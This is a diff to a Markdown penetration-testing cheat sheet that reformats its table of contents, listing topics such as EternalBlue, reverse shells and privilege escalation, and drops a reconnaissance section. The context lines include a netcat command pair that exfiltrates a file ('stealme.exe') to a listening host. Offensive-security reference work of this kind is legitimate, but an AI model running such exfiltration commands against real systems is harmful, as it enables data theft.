@@ -2,56 +2,23 @@
 **Author:** Victor Fernandez III
 
 ### Table of Contents
-* [Reconnaissance](#reconnaissance)
-* [Enumeration](#enumeration)
-  * [FTP](#ftp)
-  * [SSH](#ssh)
-  * [SMTP](#smtp)
-  * [HTTP](#http)
-  * [POP3](#pop3)
-  * [RPC](#rpc)
-  * [NetBIOS](#netbios)
-  * [SMB](#smb)
-  * [Rsync](#rsync)
-  * [NFS](#nfs)
-  * [SQL](#sql)
-  * [RDP](#rdp)
-  * [Postgres](#postgres)
-  * [WinRM](#winrm)
-  * [IRC](#irc)
-* [Gaining Access](#gaining-access)
-  * [Default Credentials](#default-credentials)
-  * [Hydra](#hydra)
-  * [Patator](#patator)
-  * [Crowbar](#crowbar)
-  * [John the Ripper](#john-the-ripper)
-  * [Hashcat](#hashcat)
-  * [Local File Inclusions](#local-file-inclusions)
-  * [MS09-050](#ms09-050)
-  * [EternalBlue](#eternalblue)
-  * [SambaCry](#sambacry)
-  * [ShellShock via SMTP](#shellshock-via-smtp)
-  * [SQL Injection](#sql-injection)
-* [Maintaining Access](#maintaining-access)
-  * [Python Bind Shell](#python-bind-shell)
-  * [Python Reverse Shell](#python-reverse-shell)
-  * [Bash Reverse Shells](#bash-reverse-shells)
-  * [MSFVenom Reverse Shells](#msfvenom-reverse-shells)
-  * [Netcat Reverse Shells](#netcat-reverse-shells)
-  * [PowerShell Reverse Shell](#powershell-reverse-shell)
-  * [JavaScript Reverse Shell](#javascript-reverse-shell)
-  * [Information to Gather for Privilege Escalation](#information-to-gather-for-privilege-escalation)
-  * [Linux Privilege Escalation](#linux-privilege-escalation)
-  * [Windows Privilege Escalation](#windows-privilege-escalation)
-  * [Juicy Potato](#juicy-potato)
-  * [Persistence](#persistence)
-* [Covering Tracks](#covering-tracks)
-
-### Reconnaissance
-The purpose of the Reconnaissance phase is to observe and collect information about the network without adding any additional traffic to it. For your report, summarize what you find in a table similar to the one below. 
-| Network ID | Subnet Mask | Default Gateway | Computers |
-| ---------- | ----------- | --------------- | ---------------- |
-| 10.11.12.0 | 255.255.255.0 | 10.11.12.254 | 5 |
+| [Enumeration](#enumeration) | [Gaining Access](#gaining-access) | [Maintaining Access](#maintaining-access) |
+| --------------------------------- | --------------------------- | ----------------------------------------- |
+| [FTP](#ftp) | [Default Credentials](#default-credentials) | [Python Bind Shell](#python-bind-shell) |
+| [SSH](#ssh) | [Hydra](#hydra) | [Python Reverse Shell](#python-reverse-shell) |
+| [SMTP](#smtp) | [Patator](#patator) | [Bash Reverse Shells](#bash-reverse-shells) |
+| [HTTP](#http) | [Crowbar](#crowbar) | [MSFVenom Reverse Shells](#msfvenom-reverse-shells) |
+| [POP3](#pop3) | [John the Ripper](#john-the-ripper)| [Netcat Reverse Shells](#netcat-reverse-shells) |
+| [RPC](#rpc) | [Hashcat](#hashcat) | [PowerShell Reverse Shell](#powershell-reverse-shell) |
+| [NetBIOS](#netbios) | [Local File Inclusions](#local-file-inclusions) | [JavaScript Reverse Shell](#javascript-reverse-shell) |
+| [SMB](#smb) | [MS09-050](#ms09-050) | [Information to Gather for Privilege Escalation](#information-to-gather-for-privilege-escalation) |
+| [Rsync](#rsync) | [EternalBlue](#eternalblue) | [Linux Privilege Escalation](#linux-privilege-escalation) |
+| [NFS](#nfs) | [SambaCry](#sambacry) | [Windows Privilege Escalation](#windows-privilege-escalation) |
+| [SQL](#sql) | [ShellShock via SMTP](#shellshock-via-smtp) | [Juicy Potato](#juicy-potato) |
+| [RDP](#rdp) | [SQL Injection](#sql-injection)| [Persistence](#persistence) |
+| [Postgres](#postgres) ||
+| [WinRM](#winrm) ||
+| [IRC](#irc) ||
 
 ### Enumeration
 The purpose of the Enumeration phase is to narrow-down the number of possible attack vectors by querying computers within scope and collecting additional information. For your report, summarize open ports, running services, and Operating Systems (OS) in use in a table similar to the one below. 
@@ -768,9 +735,4 @@ Exfil via Netcat.
 ```bash
 nc -nvlp 5050 > stolen.exe
 nc.exe -w3 10.11.12.13 5050 < stealme.exe
-```
-
-### Covering Tracks
-```bash
-# techniques go here :)
 ```
